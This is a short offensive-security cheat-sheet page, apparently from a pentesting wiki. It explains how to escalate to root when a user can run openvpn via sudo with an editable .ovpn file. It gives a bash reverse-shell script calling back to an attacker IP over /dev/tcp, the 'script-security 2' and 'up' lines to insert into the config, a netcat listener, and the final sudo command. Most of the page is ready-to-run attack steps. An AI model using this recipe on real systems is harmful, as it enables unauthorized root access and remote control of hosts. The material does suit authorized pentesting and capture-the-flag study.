# Sudo OpenVPN Privilege Escalation

The `sudo openvpn` command might be vulnerable to privilege escalation.

### Investigation <a href="#investigation" id="investigation"></a>

```
(root) /usr/sbin/openvpn /opt/example.ovpn
```

If we can execute **`openvpn`** command as root and we have a **permission of editing** the **`.ovpn`** file, we can escalate to privilege.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Create a Payload <a href="#id-1-create-a-payload" id="id-1-create-a-payload"></a>

First create a shell script to reverse shell. For example, create **`/tmp/shell.sh`**.\
Replace **`<local-ip>`** with your local ip address.

```
#!/bin/bash

bash -i >& /dev/tcp/<local-ip>/4444 0>&1
```

Then change the file permission so that root can execute this script.

```
chmod +x /tmp/shell.sh
```

#### 2. Edit .ovpn File <a href="#id-2-edit-ovpn-file" id="id-2-edit-ovpn-file"></a>

Next edit the **`.ovpn`** file.\
We need to add **"script-security 2"** and **"`up /tmp/shell.sh`"** into the header.

```
# /opt/example.ovpn
...
script-security 2
up /tmp/shell.sh

<ca>
-----BEGIN CERTIFICATE-----
...
```

#### 3. Reverse Shell <a href="#id-3-reverse-shell" id="id-3-reverse-shell"></a>

In local machine, start a listener.

```
nc -lvnp 4444
```

Now execute `openvpn` command as root.

```
sudo /usr/sbin/openvpn /opt/example.ovpn
```

This command executes our **`shell.sh`**, so we should get a root shell.
